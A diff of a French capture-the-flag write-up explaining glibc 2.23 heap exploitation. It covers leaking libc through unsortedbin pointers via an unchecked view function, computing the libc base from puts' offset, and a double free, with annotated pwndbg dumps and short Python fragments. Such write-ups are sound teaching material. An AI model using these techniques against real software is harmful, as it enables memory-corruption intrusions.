@@ -46,15 +46,14 @@ GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Ro
 ```
 
 
-Ok, au vu des actions que l'on peut effectuer (malloc, free, edit, ...) plusieurs possibilités s'offre à nous.
-Néanmoins, pour obtenir un shell, il va nous falloir à un moment leaker la libc. Pour ce faire, on va utiliser les deux premières fonctions.
-
-En effet, si on ajoute un chunk d'une taille assez grande (ici 0x80), et qu'on le free par la suite, malloc va l'ajouter dans l'unsortedbin.
+Avant toute chose, nous devons obtenir un leak de la libc. Cela nous sera utile pour obtenir un shell.
+Pour ce faire, on va utiliser les deux premières fonctions.
+On ajoute donc deux chunk d'une taille assez grande (ici 0x80) pour qu'ils finissent dans ```unsortedbin```.
 
 ```c
 pwndbg> vis
 
-0x55555555b000	0x0000000000000000	0x0000000000000091	................
+0x55555555b000	0x0000000000000000	0x0000000000000091	................   <-- Premier chunk
 0x55555555b010	0x0000000000000000	0x0000000000000000	................
 0x55555555b020	0x0000000000000000	0x0000000000000000	................
 0x55555555b030	0x0000000000000000	0x0000000000000000	................
@@ -63,7 +62,7 @@ pwndbg> vis
 0x55555555b060	0x0000000000000000	0x0000000000000000	................
 0x55555555b070	0x0000000000000000	0x0000000000000000	................
 0x55555555b080	0x0000000000000000	0x0000000000000000	................
-0x55555555b090	0x0000000000000000	0x0000000000000091	................
+0x55555555b090	0x0000000000000000	0x0000000000000091	................   <-- Deuxième chunk
 0x55555555b0a0	0x0000000000000000	0x0000000000000000	................
 0x55555555b0b0	0x0000000000000000	0x0000000000000000	................
 0x55555555b0c0	0x0000000000000000	0x0000000000000000	................
@@ -75,21 +74,21 @@ pwndbg> vis
 0x55555555b120	0x0000000000000000	0x0000000000020ee1	................	 <-- Top chunk
 ```
 
-Ensuite, nous pouvons lire les données présentes dans le premier chunk.
+Par la suite, on free le premier chunk, malloc va alors l'ajouter dans ```unsortedbin```. 
 
 ```c
 pwndbg> vis
 
 0x55555555b000	0x0000000000000000	0x0000000000000091	................	 <-- unsortedbin[all][0]
-0x55555555b010	0x00007ffff7dd1b78	0x00007ffff7dd1b78	x.......x.......
-0x55555555b020	0x0000000000000000	0x0000000000000000	................
-0x55555555b030	0x0000000000000000	0x0000000000000000	................
-0x55555555b040	0x0000000000000000	0x0000000000000000	................
+0x55555555b010	0x00007ffff7dd1b78	0x00007ffff7dd1b78	x.......x.......   // Les pointeurs FD et BK 
+0x55555555b020	0x0000000000000000	0x0000000000000000	................   // sont set à l'adresse du
+0x55555555b030	0x0000000000000000	0x0000000000000000	................   // fake chunk de unsortedbin
+0x55555555b040	0x0000000000000000	0x0000000000000000	................   // dans la main_arena
 0x55555555b050	0x0000000000000000	0x0000000000000000	................
 0x55555555b060	0x0000000000000000	0x0000000000000000	................
 0x55555555b070	0x0000000000000000	0x0000000000000000	................
 0x55555555b080	0x0000000000000000	0x0000000000000000	................
-0x55555555b090	0x0000000000000090	0x0000000000000090	................
+0x55555555b090	0x0000000000000090	0x0000000000000090	................   <-- Deuxième chunk
 0x55555555b0a0	0x0000000000000000	0x0000000000000000	................
 0x55555555b0b0	0x0000000000000000	0x0000000000000000	................
 0x55555555b0c0	0x0000000000000000	0x0000000000000000	................
@@ -133,7 +132,7 @@ static void _int_free (mstate av, mchunkptr p, int have_lock){
 ```
 
 
-Unsortedbin fonctionnant en FIFO, il est ajouté sur la HEAD de la liste de l'unsortedbin, et ces pointeurs FD et BK pointent donc sur le fake chunk de l'unsortedbin dans la ```main_arena```.
+Fonctionnant en FIFO, le chunk est donc ajouté sur la ```HEAD``` de la liste de ```unsortedbin```, FD et BK pointent donc sur le fake chunk de l'unsortedbin dans la ```main_arena```.
 
 ```c
 pwndbg> dq &main_arena 14
@@ -146,12 +145,14 @@ pwndbg> dq &main_arena 14
 00007ffff7dd1b80     0000000000000000 000055555555b000
 ```
 
-Ok, alors maintenant, on lance notre payload, unpack le résultat et calculons le bon offset.
+On peut maintenant utiliser la méthode ```view()``` pour lire un chunk par index. 
+Cette fonction ne vérifie pas si le chunk libre ou non, on peut donc lire le premier chunk et obtenir ce que contient les users data du premier chunk : l'adresse de ```unsortedbin``` dans la ```main_arena```.
 
 ## Libc leak
-Pour trouver la bonne base adresse, on prend la différence entre notre la position du fake chunk de unsortedbin et d'une fonction dont l'offset est connu (j'ai choisi ici puts).
+Pour trouver l'adresse de base de la libc, on prend la différence entre l'adresse leaked de la ```main_arena``` et on lui soustrait l'adresse d'un fonction dont l'offset est connu (ex: puts)
+Puis, on additionne cette différence avec l'offset de ```puts``` dans la libc.
+Pour finir, on soustrait cette somme avec l'adresse leak pour obtenir l'adresse de base.
 
-Ensuite, on ajoute la différence des deux avec l'offset de puts, et on obtient la différence entre le fake chunk et l'adresse de base.
 
 ```python
 ## leak libc addr
@@ -184,9 +185,9 @@ else {
 ...
 ```
 
-## Double free - UAF
+## Double free
 
-Le programme nous permettant de contrôler l'index du chunk que l'on soit manipuler cela devient assez simple:
+Les fonctions nous permettant de contrôler l'index du chunk que l'on manipule, sans vérifier si le chunk est free ou non, cela devient assez simple:
 
 ```python
 add(2, 0x68)
